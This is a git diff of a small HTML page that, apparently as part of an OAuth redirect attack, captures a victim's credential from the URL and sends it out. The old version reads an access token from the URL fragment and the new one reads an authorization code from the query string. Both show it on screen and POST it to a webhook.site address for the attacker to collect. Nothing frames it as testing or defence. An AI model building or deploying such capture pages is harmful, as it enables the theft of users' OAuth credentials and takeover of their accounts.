@@ -1,25 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Token Captured</title>
-</head>
+<head><title>OAuth Code Capture</title></head>
 <body>
   <h2>Processing...</h2>
   <script>
-    const hash = window.location.hash.substring(1);
-    const token = new URLSearchParams(hash).get("access_token");
+    const query = new URLSearchParams(window.location.search);
+    const code = query.get("code");
 
-    if (token) {
-      document.body.innerHTML = "<h2>✅ Token Captured!</h2><p>" + token + "</p>";
+    if (code) {
+      document.body.innerHTML = "<h2>✅ Code Captured!</h2><p>" + code + "</p>";
 
-      // Send it to webhook.site so you can view it
       fetch("https://webhook.site/3b98c118-cca2-4303-9da8-ae30e2bb1fd1", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ token: token })
+        body: JSON.stringify({ code: code })
       });
     } else {
-      document.body.innerHTML = "<h2>❌ No token found.</h2>";
+      document.body.innerHTML = "<h2>❌ No code found.</h2>";
     }
   </script>
 </body>
